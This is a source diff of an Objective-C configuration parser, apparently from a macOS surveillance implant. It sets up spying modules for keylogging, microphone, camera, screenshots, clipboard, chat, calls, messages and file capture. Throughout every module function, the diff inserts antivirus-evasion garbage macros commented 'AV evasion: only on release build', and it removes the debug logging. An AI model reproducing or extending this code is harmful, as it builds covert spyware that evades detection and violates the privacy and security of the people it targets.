@@ -5,50 +5,70 @@
 //  Created by kiodo on 23/02/12.
 //  Copyright 2012 __MyCompanyName__. All rights reserved.
 //
+#import "RCSMCommon.h"
 
 #import "SBJSon.h"
-#import "RCSMCommon.h"
 #import "RCSIJSonConfiguration.h"
 
-#define DEBUG_JSON_CONFIG_
+#import "RCSMAVGarbage.h"
 
-@implementation SBJSonConfigDelegate
+//#define DEBUG_JSON_CONFIG_
 
-- (id)init
-{
-  self = [super init];
-  
-  if (self) {
-    adapter = [[SBJsonStreamParserAdapter alloc] init];
-    adapter.delegate = (id)self;
-    
-    parser = [[SBJsonStreamParser alloc] init];
-    parser.delegate = adapter;
-    
-//    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
-//    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
-//    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
-  }
-  
-  return self;
-}
+@interface SBJSonConfigDelegate (hidden)
 
-- (void)dealloc
-{
-//  [mEventsList release];
-//  [mAgentsList release];
-//  [mActionsList release];
-  
-  [parser release];
-  [adapter release];
-  [super dealloc];
-}
+- (void)initFileModule: (NSDictionary *)aModule;
+- (void)initABModule: (NSDictionary *)aModule;
+- (void)initDeviceModule: (NSDictionary *)aModule;
+- (void)initPositionModule: (NSDictionary *)aModule;
+- (void)initCalllistModule: (NSDictionary *)aModule;
+- (void)initCalendarModule: (NSDictionary *)aModule;
+- (void)initMicModule: (NSDictionary *)aModule;
+- (void)initCameraModule: (NSDictionary *)aModule;
+- (void)initScrshotModule: (NSDictionary *)aModule;
+- (void)initUrlModule: (NSDictionary *)aModule;
+- (void)initMouseModule: (NSDictionary *)aModule;
+- (void)initChatModule: (NSDictionary *)aModule;
+- (void)initAppModule: (NSDictionary *)aModule;
+- (void)initKeyLogModule: (NSDictionary *)aModule;
+- (void)initClipboardModule: (NSDictionary *)aModule;
+- (void)initMessagesModule: (NSDictionary *)aModule;
+- (void)initCallModule: (NSDictionary *)aModule;
+
+- (NSTimeInterval)calculateMsecFromMidnight:(NSString*)aDate;
+- (void)addProcessEvent: (NSDictionary *)anEvent;
+- (int64_t)calculateWinDate:(NSString*)aDate;
+- (int64_t)calculateDaysDate:(NSNumber*)aDay;
+- (u_int)timerGetSubtype:(NSDictionary*)anEvent;
+- (void)addTimerEvent: (NSDictionary *)anEvent;
+- (void)addStandbyEvent: (NSDictionary *)anEvent;
+- (void)addSimchangeEvent: (NSDictionary *)anEvent;
+- (void)addConnectionEvent: (NSDictionary *)anEvent;
+- (void)addBatteryEvent: (NSDictionary *)anEvent;
+- (void)addACEvent: (NSDictionary *)anEvent;
+- (void)addIdleEvent: (NSDictionary *)anEvent;
+- (void)addNULLEvent: (NSDictionary *)anEvent;
+- (void)addQuotaEvent: (NSDictionary *)anEvent;
+
+- (NSMutableDictionary *)initActionUninstall:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionInfolog:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionModule:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionSync:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionEvent:(NSDictionary *)subAction;
+- (NSMutableDictionary *)initActionCommand:(NSDictionary *)subAction;
+- (NSMutableArray *)initSubActions:(NSArray *)subactions;
+- (NSMutableDictionary *)initSubActions:(NSArray *)subactions 
+                              forAction:(NSNumber *)actionNum;
+
+@end
+
+@implementation SBJSonConfigDelegate (hidden)
 
 #
 #
-#pragma mark Modules parsing
+# pragma mark Modules parsing
 #
 #
+
 typedef struct _fileConfiguration {
   u_int minFileSize;
   u_int maxFileSize;
@@ -68,25 +88,50 @@ typedef struct _fileConfiguration {
   
   file_t file;
   int64_t winDate;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;  
   NSData *dataNull = [NSData dataWithBytes: "\x00\x00" length:2];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_FILECAPTURE];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
   NSNumber *capture = [aModule objectForKey:@"capture"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *open    = [aModule objectForKey:@"open"];
   NSNumber *minsize = [aModule objectForKey:@"minsize"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *maxsize = [aModule objectForKey:@"maxsize"];
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSString *date    = [aModule objectForKey:@"date"];
   NSArray  *accept  = [aModule objectForKey:@"accept"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSArray  *deny    = [aModule objectForKey:@"deny"];
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   file.maxFileSize = (maxsize != nil ? [maxsize intValue] : 500000);
   file.noFileOpen  = (open    != nil ? ![open boolValue] : FALSE);
   
@@ -101,33 +146,60 @@ typedef struct _fileConfiguration {
       file.minFileSize = 0;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   winDate = [self calculateWinDate: (date != nil ? date : @"1970-01-01 00:00:00")];
   
   file.loMinDate = winDate & 0xFFFFFFFF;
   file.hiMinDate = (winDate >> 32) & 0xFFFFFFFF;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   file.acceptCount = (accept != nil ? [accept count] : 0) ; 
   file.denyCount   = (deny   != nil ? [deny count] : 0);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // fill the string array
   NSMutableData *acceptStrings = [[NSMutableData alloc] initWithLength: 0];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   for (int i=0; i < file.acceptCount; i++) 
     {
       NSString *tmpStr  = [accept objectAtIndex:i];
       NSData   *dataStr = [tmpStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       [acceptStrings appendData:dataStr];
       [acceptStrings appendData:dataNull]; 
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableData *denyStrings = [[NSMutableData alloc] initWithLength: 0];
-      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   for (int i=0; i < file.denyCount; i++) 
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       NSString *tmpStr  = [deny objectAtIndex:i];
       NSData   *dataStr = [tmpStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       [denyStrings appendData:dataStr];
       [denyStrings appendData:dataNull]; 
     }
@@ -135,8 +207,14 @@ typedef struct _fileConfiguration {
   
   NSMutableData *data = [[NSMutableData alloc] initWithCapacity:0];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   // struct without patterns[1]
   NSData *dataStruct = [NSData dataWithBytes:&file length:(sizeof(u_int)*9)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   [data appendData: dataStruct];
   [data appendData: acceptStrings];
@@ -145,15 +223,24 @@ typedef struct _fileConfiguration {
   [acceptStrings release];
   [denyStrings release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
                                     @"data",
                                     nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   objects = [NSArray arrayWithObjects: type, 
                                        enabled, 
                                        data,
                                        nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -162,11 +249,23 @@ typedef struct _fileConfiguration {
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [mAgentsList addObject: moduleConfiguration];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [pool release];
 }
@@ -176,15 +275,27 @@ typedef struct _fileConfiguration {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;  
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
@@ -196,14 +307,26 @@ typedef struct _fileConfiguration {
                                        MODULE_EMPTY_CONF,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [moduleConfiguration release];
   
@@ -214,36 +337,63 @@ typedef struct _fileConfiguration {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_DEVICE];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   // not used yet
   NSNumber *applist = [aModule objectForKey:MODULE_DEVICE_APPLIST_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   keys = [NSArray arrayWithObjects: @"agentID",
           @"status",
           @"data",
           nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   objects = [NSArray arrayWithObjects: type, 
              enabled, 
              (applist != nil ? applist : MODULE_EMPTY_CONF),
              nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   [moduleConfiguration release];
   
@@ -263,41 +413,72 @@ typedef struct _position {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSArray *keys = nil;
   NSArray *objects = nil; 
   NSData *data;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   id enabled = AGENT_DISABLED; 
   position_t posStruct;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_POSITION];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
   posStruct.iType = LOGGER_WIFI;
   posStruct.sleepTime = 30;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   data = [[NSData alloc] initWithBytes: &posStruct length:sizeof(posStruct)];
   
   if (status != nil || [status boolValue] == TRUE)
     enabled = AGENT_ENABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
                                     @"data",
                                     nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   objects = [NSArray arrayWithObjects: type, 
                                        enabled, 
                                        data,
                                        nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [moduleConfiguration release];
   
@@ -309,21 +490,32 @@ typedef struct _position {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CALL_LIST];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   keys = [NSArray arrayWithObjects: @"agentID",
           @"status",
@@ -335,14 +527,23 @@ typedef struct _position {
              MODULE_EMPTY_CONF,
              nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   [pool release];
 }
@@ -351,33 +552,50 @@ typedef struct _position {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSArray *keys;
   NSArray *objects;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_ORGANIZER];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   keys = [NSArray arrayWithObjects: @"agentID",
           @"status",
           @"data",
           nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   objects = [NSArray arrayWithObjects: type, 
              AGENT_DISABLED, 
              MODULE_EMPTY_CONF,
              nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [moduleConfiguration release];
   
@@ -389,14 +607,23 @@ typedef struct _position {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   microphoneAgentStruct_t micStruct;
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSNumber *type   = [NSNumber numberWithUnsignedInt: AGENT_MICROPHONE];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   // not used
   // NSNumber *vad    = [aModule objectForKey:MODULE_MIC_VAD_KEY];
@@ -404,12 +631,25 @@ typedef struct _position {
   NSNumber *sil    = [aModule objectForKey: MODULE_MIC_SILENCE_KEY];
   NSNumber *thr    = [aModule objectForKey: MODULE_MIC_THRESHOLD_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   memset(&micStruct, 0, sizeof(micStruct));
   micStruct.detectSilence = (sil != nil ? [sil unsignedIntValue] : 5);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   micStruct.silenceThreshold = (int)(thr != nil ? ([thr floatValue] * 100) : 22);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   data = [[NSData alloc] initWithBytes: &micStruct length: sizeof(microphoneAgentStruct_t)];
   
@@ -423,16 +663,28 @@ typedef struct _position {
                                        data,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
 
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [data release];
   
@@ -444,45 +696,82 @@ typedef struct _position {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   cameraStruct_t camStruct;
   id enabled = AGENT_ENABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
 
   NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_CAM];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // timeStep and numStep forced for new paradigm: event repeatition
   camStruct.sleepTime   = 0;
   camStruct.numOfFrame  = 1;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   // setup module structs NSData
   data = [[NSData alloc] initWithBytes: &camStruct length: sizeof(cameraStruct_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
                                     @"data",
                                     nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   objects = [NSArray arrayWithObjects: type, 
                                        enabled, 
                                        data,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
- 
-   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [data release];
   
@@ -494,21 +783,33 @@ typedef struct _position {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   screenshotAgentStruct_t scrStruct;
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
- 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSNumber *type    = [NSNumber numberWithUnsignedInt:AGENT_SCREENSHOT];
   NSNumber *onlyWin = [aModule objectForKey:MODULE_SCRSHOT_ONLYWIN_KEY];
   NSNumber *newWin  = [aModule objectForKey:MODULE_SCRSHOT_NEWWIN_KEY];
   NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
   memset(&scrStruct, 0, sizeof(scrStruct));
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // setup module structs
   scrStruct.grabActiveWindow  = (onlyWin != nil ? [onlyWin unsignedIntValue] : 0);
@@ -516,7 +817,13 @@ typedef struct _position {
   scrStruct.sleepTime         = 0xFFFFFFFF;
   scrStruct.dwTag             = 0xFFFFFFFF;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   data = [[NSData alloc] initWithBytes: &scrStruct length: sizeof(screenshotAgentStruct_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
@@ -528,16 +835,28 @@ typedef struct _position {
                                        data,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
  
-   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
+  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [data release];
   
@@ -554,19 +873,31 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   urlStruct url;
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_URL];
   NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   url.delimiter         = 0;
   url.isSnapshotActive  = FALSE;
   
   data = [[NSData alloc] initWithBytes: &url length:sizeof(url)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
@@ -575,6 +906,9 @@ typedef struct  {
                                     @"status",
                                     @"data",
                                     nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   objects = [NSArray arrayWithObjects: type, 
                                        enabled, 
@@ -585,13 +919,25 @@ typedef struct  {
                                                          forKeys: keys];
   
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
   [mAgentsList addObject: moduleConfiguration];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [data release];
   
@@ -608,24 +954,39 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   mouse_t mouse;
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   NSData  *data;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_MOUSE];
   NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
   NSNumber *width   = [aModule objectForKey: @"width"];
   NSNumber *height  = [aModule objectForKey: @"height"];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   mouse.width   = (width  != nil ? [width  intValue] : 50);
   mouse.height  = (height != nil ? [height intValue] : 50);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   data = [[NSData alloc] initWithBytes: &mouse length:sizeof(mouse)];
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
@@ -637,17 +998,29 @@ typedef struct  {
                                        data,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [data release];
   
@@ -658,16 +1031,25 @@ typedef struct  {
 - (void)initChatModule: (NSDictionary *)aModule
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: AGENT_CHAT];
   NSNumber *status  = [aModule objectForKey: MODULES_STATUS_KEY];
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
@@ -679,15 +1061,27 @@ typedef struct  {
                                        MODULE_EMPTY_CONF,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [moduleConfiguration release];
   
@@ -699,41 +1093,67 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_APPLICATION];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   keys = [NSArray arrayWithObjects: @"agentID",
           @"status",
           @"data",
           nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   objects = [NSArray arrayWithObjects: type, 
              enabled, 
              MODULE_EMPTY_CONF,
              nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
-  
+  // AV evasion: only on release build
+  AV_GARBAGE_003 
   
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [pool release];
 }
 
@@ -742,15 +1162,24 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
